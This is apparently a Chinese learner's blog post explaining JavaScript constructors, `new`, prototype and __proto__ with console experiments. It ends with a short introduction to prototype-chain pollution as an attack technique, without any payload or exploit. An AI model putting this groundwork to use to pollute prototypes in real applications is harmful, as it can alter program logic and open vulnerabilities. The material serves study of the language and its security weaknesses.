<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applySub</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">op</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> -= op
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">num1, num2</span>) {
    <span class="hljs-keyword">return</span> num1 + num2
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property">sub</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">num1, num2</span>) {
    <span class="hljs-keyword">return</span> num1 - num2
}

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">applyAdd</span>(<span class="hljs-number">2</span>).<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-title function_">sub</span>(<span class="hljs-number">11</span>, <span class="hljs-number">5</span>))</code></pre>
<p>现在我们注意下面几个细节</p>
<ul>
<li>用函数实现时，<code>function Calculator</code>的内容（参数、函数体）与用类实现时的<code>constructor</code>相同</li>
<li>用函数实现时，<strong>方法</strong><code>applyAdd、applySub</code>声明在<code>Calculator.prototype</code>层中</li>
<li>用函数实现时，<strong>静态方法</strong><code>add、sub</code>直接声明在<code>Calculator</code>层中</li>
</ul>
<h2 id="32-new-做了什么">3.2 new 做了什么</h2>
<p>可以说 JavaScript 的任何一个对象都是一个 Object，不论是<code>Number``String``Array</code>等，它们都具有一种 <strong>JSON 结构</strong>（注意，JavaScript 中含有<code>JSON</code>类，此处的 JSON 泛指一种数据结构，与<code>JSON</code>类无关），我们称为“对象”，为了与类创建的实例（也称为“对象”）作区分，我们称类创建的实例为“实例”，“实例”也是“对象”</p>
<p>也就是说，函数<code>Calculator</code>本身就具有一种 JSON 结构，它具有它的 JSON 属性、JSON 方法</p>
<p>我们把注意力放在<code>let calc = new Calculator(1)</code>这一行上</p>
<p>事实上，这两种实现方法（用<code>class</code>语法和用函数实现）的<code>Calculator</code>最终具有相同的 JSON 结构，其中，基于函数的实现更接近 JavaScript 的本真逻辑，而<code>class</code>更像是一种<strong>语法糖</strong></p>
<p>**注意：**此处不要将两种实现方式的<code>Calculator</code>分别命名成<code>Calculator1</code>和<code>Calculator2</code>，然后通过<code>Calculator1 == Calculator2</code>或者<code>Calculator1 === Calculator2</code>去比较，它将永远返回<code>false</code>，因为两者的地址是不一样的，正如<code>[] == []</code>和<code>({}) == ({})</code>的返回值也是<code>false</code>一样</p>
<p>那么，根据我们所注意到的几个细节，我们猜测：</p>
<ol>
<li>进行 new 操作时，JavaScript 创建了一个新的 JSON 结构，这个结构<strong>继承</strong>自<code>Calculator</code>的<code>prototype</code>属性——这一过程引入了<strong>方法</strong></li>
<li>随后，以这个新创建的 JSON 结构为<code>this</code>，传递参数<code>num=1</code>并运行<strong>构造器</strong><code>constructor</code>中的内容——这一过程引入了<strong>属性</strong></li>
<li>至于<strong>静态方法</strong>则很好理解，我们调用静态方法写的是<code>Calculator.add``Calculator.sub</code>，那么这些静态方法也自然引入于<code>Calculator</code>的 JSON 结构本身之中</li>
</ol>
<p>实例创建后，为了追溯这一过程，新创建的实例的 JSON 结构会带有<code>constructor</code>属性，指向创建它的<strong>构造器</strong>，在此处为<code>Calculator</code>（函数）；带有<code>__proto__</code>属性，指向它的原型，也就是它继承过来的地方，在此处为<code>Calculator.prototype</code></p>
<p>接下来我们进行验证</p>
<p>我们注意到，基于函数实现的写法中，<code>new Calculator(1)</code>的<code>Calculator</code>本身是一个函数，事实上它就是<code>constructor</code>函数本身</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（不论是哪种类的实现方法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Calculator</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029175445596.png" alt="image-20231029175445596"></p>
<p>即使用<code>class</code>语法创建，我们也能够看到<strong>方法</strong>位于<code>Calculator</code>的<code>prototype</code>之中</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（使用 class 语法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">applyAdd</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applyAdd</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">applySub</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applySub</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029214147601.png" alt="image-20231029214147601"></p>
<p>结合上面的结论，显然，下面表达式的运行结果也是<code>true</code></p>
<pre><code class="hljs http">calc.applyAdd === calc.constructor.prototype.applyAdd
calc.applySub === calc.constructor.prototype.applySub</code></pre>
<p>接下来我们验证<code>calc</code>下面的<code>__proto__</code>，它指向了它的<strong>原型</strong></p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（不论是哪种类的实现方法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">__proto__</span> === calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029214539647.png" alt="image-20231029214539647"></p>
<p>我们看到，new 的过程实际上就是根据类创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤：</p>
<ol>
<li>为实例添加<strong>方法</strong>：以类的<code>prototype</code>作为<strong>原型</strong>“复制”出一个新的对象（JSON 结构）</li>
<li>为实例添加<strong>属性</strong>、进行初始化操作：运行类的<strong>构造器</strong><code>constructor</code></li>
<li>为实例“添加”<code>constructor</code>和<code>__proto__</code>属性，分别指向创建它时的构造器和原型</li>
</ol>
<p>事实上，上述的描述并不准确，我们将在稍后予以纠正</p>
<h2 id="33-构造器-constructor">3.3 构造器 constructor</h2>
<p>刚才的 new 操作完全可以写成</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc2 = <span class="hljs-keyword">new</span> calc.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>)</code></pre>
<p>这意味着，创建一个类的含义就是创建了一个<strong>构造器</strong>函数，创建一个实例的含义就是在<strong>继承</strong>的基础上运行了这个构造器函数</p>
<p>为了确保继承过程顺利进行，这个构造器函数必须含有以下特征</p>
<ul>
<li>包含<code>prototype</code>属性</li>
</ul>
<p>而在 JavaScript 中，任意函数都默认具有<code>prototype</code>属性，因此，任意函数都符合一个构造器的标准，任意函数都是一个构造器，可用于生成类实例</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TestClass</span>(<span class="hljs-params"></span>) {}
<span class="hljs-keyword">let</span> test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>()</code></pre>
<p>以上代码并不会报错</p>
<p>在 JavaScript 中，<strong>继承</strong>这个概念贯彻在许多操作中，每一个新的 JSON 结构的诞生，都进行了类似 new 的逻辑，因此，任何一个对象（除了<code>null</code>）都具有<code>constructor</code>属性，包括构造器本身</p>
<p>构造器本身是一个函数，当我们循环访问<code>constructor</code>时将得到 JavaScript 预定义的构造器<code>Function</code>，而<code>Function</code>的构造器仍然是它本身</p>
<pre><code class="hljs js"><span class="hljs-title class_">Function</span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Function</span></code></pre>
<p>以上表达式将返回<code>true</code></p>
<p>我们可以总结出如下现象</p>
<ul>
<li>构造器链的尽头是<code>Function</code></li>
<li><code>Function</code>的构造器是<code>Function</code>本身</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029215044763.png" alt="image-20231029215044763"></p>
<p>下面这张图更加地趋近本质，可以稍后再来体悟</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029215113706.png" alt="image-20231029215113706"></p>
<h2 id="34-原型和继承">3.4 原型和继承</h2>
<p>当我们谈论 JavaScript 的原型，实际上是在谈论对象（JSON 结构）之间的特殊关系，有继承就有原型，有原型就有继承</p>
<p>原型的定义大致可以描述为：<code>A</code>和<code>B</code>是两个 JSON 结构，<code>B</code>继承于<code>A</code>，具有<code>A</code>的全部内容，那么称<code>A</code>就是<code>B</code>的原型</p>
<p>在 JavaScript 中，一个 JSON 结构就可以称为是一个具体的对象，甚至包括<code>Number``String</code></p>
<p><code>null</code>是一个特殊的对象，它表示空，如果把对象之间的继承关系画一个遗传系谱图，那么<code>null</code>就是这张图上最原始的祖先</p>
<p>我们具有构造器函数<code>Calculator</code>，它也是一个 JSON 结构（对象），具有一个属性<code>prototype</code>，我们可以将这个属性理解为创建实例时的“模板”，当创建实例时，实例会<strong>继承</strong>这个“模板”的全部内容</p>
<p>当我们单独说谁是原型时，其实并没有意义，<code>Calculator</code>的<code>prototype</code>不是<code>Calcualtor</code>的原型，而是<code>Calculator</code>所要创建的实例（<code>calc</code>）的原型，事实上，这里命名为<code>prototype</code>（英文译为“原型”）造成了重大的歧义，经常对初学者甚至从业多年的程序员造成巨大困扰，为了方便表述、避免歧义，我们之后将把构造器的<code>prototype</code>称为构造器的“原型模板”</p>
<p>构造器<code>Calculator</code>创建出实例<code>calc</code>后，<code>calc</code>含有一个属性<code>__proto__</code>，这个属性即为<code>calc</code>的原型</p>
<p>刚才我们也提到<code>Calculator.prototype</code>也是<code>calc</code>的原型，所以它们两个是等价的，下面的表达式将返回<code>true</code></p>
<pre><code class="hljs js">calc.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p>我们可以用一张图描述这种关系，下图中的<code>prototype</code>和<code>__proto__</code>在内存中具有完全相同的地址，只是它们所隶属的 JSON 结构不一样</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029220340685.png" alt="image-20231029220340685"></p>
<p>当访问<code>calc</code>下的<code>applyAdd</code>，如果<code>calc</code>自己没有<code>applyAdd</code>，则会从它的原型中去查找，从而实现继承</p>
<p>几乎所有 JavaScript 中的对象都有原型，在 JavaScript 中，可以访问任何对象的<code>__proto__</code>属性查看它的原型</p>
<p>另一方面，有原型就有继承，有继承就有相应的构造器，我们可以访问任何对象的<code>constructor</code>属性查看它的构造器</p>
<h2 id="35-原型对象-prototype-和-proto">3.5 原型对象 prototype 和 <strong>proto</strong></h2>
<p>首先我们需要分辨清楚<code>prototype</code>和<code>__proto__</code>的区别，以<code>Calculator</code>为例，这个构造器函数的原型并不是<code>Calculator.prototype</code>，而是<code>Calculator.__proto__</code>，<code>calc</code>的原型是<code>calc.__proto__</code>等于<code>Calculator.prototype</code></p>
<p>每一个实例都由它所对应的构造器所创建，因此每一个实例都具有<code>constructor</code>和<code>__proto__</code>属性，实例的<code>constructor.prototype</code>的地址与实例的<code>__proto__</code>一致</p>
<p>但值得注意的是，当我们循环访问<code>__proto__</code>时，最终将指向<code>null</code>，而当我们循环访问<code>constructor.prototype</code>时，最终将会给出相同的结果</p>
<p>这是因为一个<strong>构造器</strong>的“原型模板”的构造器就是构造器本身</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Number</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>
<span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Function</span>
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Calculator</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === calc.<span class="hljs-property">constructor</span></code></pre>
<p>以上表达式都将返回<code>true</code></p>
<p>这种“循环自引用”的逻辑或许会有些难以理解和记忆，但它这么设计是有它的意义所在的</p>
<p>如果我们将<code>prototype</code>的<code>constructor</code>修改成其它的将会发生什么？例如</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Number</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)</code></pre>
<p>然后我们访问<code>calc.constructor</code>，它将返回<code>Number</code>构造器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029221210974.png" alt="image-20231029221210974"></p>
<p>让我们查看<code>calc</code>的 JSON 结构</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029221236044.png" alt="image-20231029221236044"></p>
<p>**注意：**这里的<code>&lt;prototype&gt;</code>（在<code>chromium</code>内核的浏览器可能显示的是<code>[[Prototype]]</code>），其实就是<code>calc</code>的原型<code>calc.__proto__</code>亦即<code>Calculator.prototype</code></p>
<p>因此，<code>calc</code>的<code>contructor</code>属性并不是被添加上去的，而是继承自<code>prototype</code>的，这是对先前“new 做了什么”的总结的第一个<strong>修正</strong>，这也说明了为什么一个构造器的<code>prototype.constructor</code>默认指向这个构造器本身</p>
<p>与<code>constructor.prototype</code>不同的是，<code>__proto__</code>将直接指向当前的 JSON 结构继承自哪里</p>
<pre><code class="hljs javascript"><span class="hljs-comment">// Calculator 请重新声明以覆盖前面对 prototype.constructor 的修改</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">__proto__</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p>运行结果如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697186478753-9e04f15b-e05c-47b3-a548-aab0d5293c30.png" alt="img"></p>
<p>对于第一条运行结果是显然的</p>
<p>对于第三条运行结果，正如我们刚才所提到的，<code>prototype</code>的<code>constructor</code>将指向<code>calc.constructor</code>，从而形成一种“循环自引用”</p>
<p>对于第二条运行结果，我们观察<code>calc.__proto__.__proto__</code>的内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029221852070.png" alt="image-20231029221852070"></p>
<p>我们注意到，calc.__proto__就是Calculator.prototype，它是一个 JSON 结构，这个 JSON 结构的原型应当是一个 JavaScript 预定义的构造器Object创建的</p>
<pre><code class="hljs js">calc.<span class="hljs-property">__proto</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-comment">//true</span></code></pre>
<p>至于为什么<code>calc.__proto__</code>（即<code>Calculator.prototype</code>）的<code>constructor</code>属性不<strong>默认</strong>指向<code>Object</code>以追求统一，这或许就是先前提到的 JavaScript 的内在逻辑为了<strong>继承</strong>方便的特性吧</p>
<p>现在，我们进行第二个对先前“new 做了什么”的总结的纠错</p>
<p>我们检查<code>calc</code>这个对象（JSON 结构）本身的层级是否具有<code>__proto__</code>属性</p>
<pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc, <span class="hljs-string">'__proto__'</span>)  <span class="hljs-comment">//false</span></code></pre>
<p>可见其实<code>calc</code>本身并不具有<code>__proto__</code>属性</p>
<p>在 JavaScript 中，当我们访问一个对象的<code>A</code>属性，如果当前对象的 JSON 结构中找不到<code>A</code>属性，JavaScript 会从它的原型中去寻找</p>
<p>由于这个特性的存在，如果它的原型（也是一个 JSON 结构）中找不到，会从它的原型的原型中去找，直到原型为<code>null</code>也没有找到则返回<code>undefined</code></p>
<p>**注意：**事实上，“原型”这个概念指的是程序运行的内在逻辑，而不是<code>__proto__</code>这些属性，是不容外部修改的，换句话说，<code>__proto__</code>默认指向了原型的地址，而并不是说改变<code>__proto__</code>则改变了原型</p>
<p>这一点可以通过修改<code>Object.prototype.a = 1</code>，然后运行<code>Object.defineProperty(calc, '__proto__', { value: 123 })</code>使得<code>calc.__proto__</code>的值变为<code>123</code>，然后访问<code>calc.a</code>进行验证，会发现它返回的结果是<code>1</code></p>
<p>我们追溯它的原型</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)
<span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)
<span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)</code></pre>
<p>第一行返回了<code>false</code>，<code>calc.__proto__</code>即<code>Calculator.prototype</code>，它的原型的 JSON 结构本身也不具有<code>__proto__</code>属性</p>
<p>第二行返回了<code>true</code>，我们再次打印<code>calc.__proto__.__proto__</code>的结果</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697188839411-0fa63bd4-e6f0-4470-9039-d8d20b204854.png" alt="img"></p>
<p>这个结果和<code>Object.prototype</code>一致</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697188879878-5029f76e-32a9-4eea-bb8e-5c57a314457a.png" alt="img"></p>
<p>我们可以从<code>Object.prototype</code>的 JSON 结构中看到，它含有一个<code>__proto__</code>属性，但是它是一个 Getter，访问<code>__proto__</code>属性将运行这个 Getter 函数，将这个函数的返回值作为<code>__proto__</code>属性的值</p>
<p>所谓 Getter，就是指一个属性的值与一个函数相绑定，访问这个属性，它的值会通过一个函数动态获取，这个函数称为这个属性的 Getter 函数</p>
<p>相应的，还有 Setter 这一概念，当通过赋值语句<code>=</code>对这个属性进行赋值时，实际上是以<code>=</code>后面的值为函数的参数调用了它的 Setter 函数</p>
<p>对于<code>__proto__</code>这一 Getter，它的逻辑在 JavaScript 解释器的代码中得到定义，而并不是 JavaScript 语言本身能够定义的</p>
<p>我们可以通过运行如下代码判断一个它是不是一个 Getter</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>)</code></pre>
<p>运行结果如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697189214644-301a6aad-0d5b-4670-837b-42eb067c77b2.png" alt="img"></p>
<p>显然<code>__proto__</code>的值是通过<code>get: __proto__()</code>动态获取的</p>
<p>我们运行<code>Object.getOwnPropertyDescriptor(Object.prototype, '__proto__').get.call(calc)</code>（意思是以<code>calc</code>为这个 Getter 的 this 指针运行这个 Getter 函数）的结果和<code>cal.__proto__</code>一样</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697189450577-1a95a685-c26a-4a85-994e-d563770d3a28.png" alt="img"></p>
<p>因此，<code>calc</code>中的<code>__proto__</code>实际上是通过 JavaScript 中层层向原型访问的机制寻找到的，它最终通过<strong>原型链</strong>指向了<code>Object.prototype</code>中的<code>__proto__</code>这一带有 Getter 的属性</p>
<p>我们可以通过下面的代码将<code>Object.prototype</code>的<code>__proto__</code>修改为一个确定的、不带有 Getter 的值</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">123</span> })</code></pre>
<p>然后我们会发现众多对象的<code>__proto__</code>都变成了<code>123</code>，包括<code>calc</code>和<code>Calculator.prototype</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697190336018-c24b4710-ed71-4aa1-b9a7-153bd8246aa7.png" alt="img"></p>
<p>为了探查<code>calc</code>继承的逻辑，我们刷新一下网页或者重置一下 JavaScript 环境，重新创建<code>Calculator</code>对象和<code>calc</code>实例，运行如下代码对<code>Calculator.prototype</code>的<code>__proto__</code>进行修改</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">123</span> })</code></pre>
<p>然后访问<code>calc.__proto__</code>，会发现它返回了<code>123</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697190652884-c58859f5-8f50-4ab4-a0e3-465fcc953bf8.png" alt="img"></p>
<p>由此我们对“new 做了什么”进行第二次<strong>修正</strong>：实际上<code>__proto__</code>属性也不是被添加上去的，而是继承自构造器的<code>prototype</code>属性</p>
<p>再一次刷新网页或者重置 JavaScript 环境，查看<code>Object.prototype</code>的<code>__proto__</code>值</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697190928756-757169ee-1ff2-4fb2-884c-15232dc0661a.png" alt="img"></p>
<p>综合上述探索和测试，我们得到如下结论</p>
<ul>
<li>一个构造器的<code>prototype</code>的构造器指向这个构造器本身</li>
<li>访问<code>__proto__</code>会通过原型链<strong>继承</strong><code>Object.prototype.__proto__</code>的结果</li>
<li><code>__proto__</code>的尽头是<code>null</code></li>
<li>在默认情况下，一个对象（JSON 结构）的原型可通过它的<code>__proto__</code>属性反映</li>
</ul>
<h2 id="36-继承与原型链new-到底做了什么">3.6 继承与原型链：new 到底做了什么</h2>
<p>通过上面的探索，我们可以给出“new 做了什么”的最终答案：</p>
<p>new 的过程实际上就是根据构造器的<code>prototype</code>属性创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤：</p>
<ol>
<li>创建一个空的 JSON 结构</li>
<li>以这个新的 JSON 结构为 this，运行类的构造器<code>constructor</code></li>
<li>在程序内部将这个 JSON 结构的<strong>原型</strong>指向构造器的<code>prototype</code></li>
<li>返回这个新的 JSON 结构</li>
</ol>
<p>实例的属性由<code>constructor</code>函数对<code>this</code>添加属性而直接添加于实例（新的 JSON 结构）之下，属性是这个实例独有的，由相同构造器创建的其它实例具有它们独有的属性，互不影响</p>
<p>实例的方法<strong>继承</strong>自构造器的<code>prototype</code>，改变构造器中的<code>prototype</code>的内容将影响到所有由这个构造器创建的实例</p>
<p>当我们访问这个实例的<code>constructor</code>属性时，JavaScript 并没有在这个实例的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，并找到了<code>constructor</code>属性，然后返回它的值</p>
<p>当我们访问这个实例的<code>__proto__</code>属性时，JavaScript 并没有在这个实例的的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，在它的原型中也没有找到，转而继续向它的原型的原型（<code>Object.prototype</code>）寻找，并找到了<code>prototype</code>属性，并返回它的值，由于它是一个 Getter，所以 JavaScript 以所访问的实例为 this 返回了这个 Getter 函数的返回值</p>
<p>我们访问实例的<code>constructor</code>和<code>__proto__</code>属性的过程反映了 JavaScript 中的一个重要概念：<strong>原型</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="1697273666377-179f0753-f392-4490-adda-0cbcd4c8d921.png" alt="img"></p>
<h2 id="37-原型链污染">3.7 原型链污染</h2>
<p>原型链指的是由多个<code>__proto__</code>连在一起而形成的链式原型访问，如<code>calc.__proto__.__proto__</code></p>
<p>在默认情况下，一个对象（JSON 结构）的<code>__proto__</code>所指向的地址与对象原型的地址是一致的</p>
<p>由 JavaScript 的原型链查找建立起来的秩序使得构造器和实例处于一种稳定的关系之中，虽然我们通过<code>Object.defineProperty(obj, '__proto__', { value })</code>的方式改变一个对象的<code>__proto__</code>属性并不能改变这个对象的原型，但是我们却能够通过<code>__proto__</code>访问到它的原型</p>
<p>如果我们对它的原型进行一些修改，就能达到改变程序逻辑的目的，从而触发一些漏洞，这种人为通过原型链修改原型的行为成为<strong>原型链污染</strong>，是一种常见的攻击手段</p>
<p>对于大多数非 JavaScript 预定义的对象，可以通过<code>__proto__</code>或者<code>constructor.prototype</code>访问它的原型，对它原型下的属性进行修改可以造成原型链污染</p>
<p>emmm总的来说，代码基础有点差，从2.5之后看的就有点困难了，因此我再结合p神的看一遍吧。。。。</p>
